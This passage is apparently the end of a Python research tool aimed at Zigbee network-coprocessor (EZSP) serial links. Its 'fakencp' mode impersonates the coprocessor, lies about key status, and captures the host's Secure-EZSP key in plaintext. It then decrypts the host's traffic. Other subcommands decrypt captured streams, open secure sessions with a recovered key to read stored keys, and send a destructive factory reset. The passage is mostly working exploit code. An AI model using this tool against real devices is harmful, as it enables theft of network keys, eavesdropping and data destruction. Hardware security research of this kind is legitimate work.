                        # EmberZigbeeNetwork: chan panId(2) extPanId(8) allowJoin stackProfile nwkUpdateId
                        net = (bytes([ch]) + bytes([0x34, 0x12])
                               + bytes([1, 2, 3, 4, 5, 6, 7, 8])
                               + bytes([1, 0x02, 0]))
                        fn.send_callback(0x1B, net + bytes([0xFF, 0xC4]))  # networkFoundHandler +lqi/rssi
                        fn.send_callback(0x1C, bytes([ch, 0x00]))          # scanCompleteHandler SUCCESS
                        log(f"{ts:8.3f}   --> faked networkFoundHandler(ch={ch},pan=0x1234) "
                            f"+ scanCompleteHandler(SUCCESS)")
                    elif fid in (0x1E, 0x1F):          # formNetwork / joinNetwork
                        fn.send_callback(0x19, bytes([0x90]))   # stackStatusHandler NETWORK_UP
                        log(f"{ts:8.3f}   --> sent stackStatusHandler(NETWORK_UP) callback")
                    continue

                # ---- pre-secure phase ----
                e = ezsp_parse(f["ezsp"])
                fid = e.get("fid")
                params = e.get("params", b"")
                nm = {0x00: "version", 0xAA: "getValue",
                      GET_SECURITY_KEY_STATUS_ID: "getSecurityKeyStatus",
                      SET_SECURITY_KEY_ID: "setSecurityKey",
                      SET_SECURITY_PARAMETERS_ID: "setSecurityParameters"}.get(fid, "?")
                log(f"{ts:8.3f} host cmd fid={fid and hex(fid)} {nm:22} params={hexb(params)}")

                if fid == SET_SECURITY_KEY_ID:
                    key = bytes(params[:16])
                    fn.captured_key = key
                    log("\n" + "=" * 68)
                    log(f"*** setSecurityKey -- KEY (plaintext) = {key.hex()} "
                        f"(type tail {params[16:].hex()}) ***")
                    log("=" * 68)
                    try:
                        if fn.sk.matches(key):
                            log(">>> matches cap_boot: REAL permanent key!")
                    except Exception:
                        pass
                    if not args.complete:
                        fn.send_data(bytes([seq]) + SET_KEY_FAIL_TAIL)   # abort, no commit
                        done = True
                        break
                    fn.key = key
                    fn.send_data(bytes([seq]) + bytes.fromhex("8001ca0000"))  # SUCCESS
                    log(f"{ts:8.3f}   --> replied SUCCESS; host will commit this key + proceed")
                elif fid == SET_SECURITY_PARAMETERS_ID and args.complete and fn.key:
                    host_rand = bytes(params[1:17])          # [level][hostRand16]
                    ncp_rand = os.urandom(16)
                    fn.host_sid, fn.ncp_sid = fn.sk.session_ids(fn.key, host_rand, ncp_rand)
                    fn.send_data(bytes([seq]) + bytes.fromhex("8001cb0000") + ncp_rand)
                    fn.secured = True
                    fn.ncp_ctr = 0
                    log(f"{ts:8.3f}   --> SECURE SESSION UP (ncpSid={fn.ncp_sid.hex()}); "
                        f"decrypting host traffic from here")
                elif fid in NCP_RSP:
                    fn.send_data(bytes([seq]) + NCP_RSP[fid])
                    if fid == GET_SECURITY_KEY_STATUS_ID:
                        log(f"{ts:8.3f}   --> replied NOT_SET (0x47) [LIE]")
                else:
                    log(f"{ts:8.3f}   (no template for fid {fid and hex(fid)}; bare ACK)")
                    fn.bare_ack()
    except KeyboardInterrupt:
        log("\nstopped.")
    finally:
        if fn.captured_key:
            log(f"\ncaptured session key: {fn.captured_key.hex()}")
        else:
            log("\nno setSecurityKey seen.")
        if logf:
            logf.close()
        fn.s.close()


HERE_DIR = __file__.rsplit("/", 1)[0]


def _load(path, name):
    import importlib.util
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    saved = sys.argv
    sys.argv = [name]
    spec.loader.exec_module(m)
    sys.argv = saved
    return m


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    p = sub.add_parser("probe")
    p.add_argument("--port", default="/dev/cu.usbmodemncpbridge1")
    p.add_argument("--version", type=int, default=8)
    s = sub.add_parser("selftest")
    s.add_argument("file")
    m = sub.add_parser("monitor")
    m.add_argument("--port", default="/dev/cu.usbmodempassthru1")
    m.add_argument("--out", default=None, help="save the raw tagged stream to this file")
    pd = sub.add_parser("passthru-decrypt")
    pd.add_argument("file")
    pd.add_argument("--key", default=None, help="16-byte UART key hex (else auto-recover from setSecurityKey)")
    rn = sub.add_parser("reset-ncp", help="DESTRUCTIVE: send resetToFactoryDefaults to the real NCP")
    rn.add_argument("--port", default="/dev/cu.usbmodemncpbridge1")
    rn.add_argument("--force", action="store_true", help="actually send it (else dry-run)")
    sq = sub.add_parser("secure-query", help="open a Secure-EZSP session with a known key and read keys/params")
    sq.add_argument("--port", default="/dev/cu.usbmodemncpbridge1")
    sq.add_argument("--key", required=True, help="16-byte UART Secure-EZSP key hex")
    fk = sub.add_parser("fakencp")
    fk.add_argument("--port", default="/dev/cu.usbmodemfakencp1")
    fk.add_argument("--complete", action="store_true",
                    help="accept the key and continue the secure session (host commits key!)")
    fk.add_argument("--out", default=None, help="append transcript to this file")
    args = ap.parse_args()
    {"probe": cmd_probe, "selftest": cmd_selftest, "monitor": cmd_monitor,
     "fakencp": cmd_fakencp, "passthru-decrypt": cmd_passthru_decrypt,
     "reset-ncp": cmd_reset_ncp, "secure-query": cmd_secure_query}[args.cmd](args)


if __name__ == "__main__":
    main()
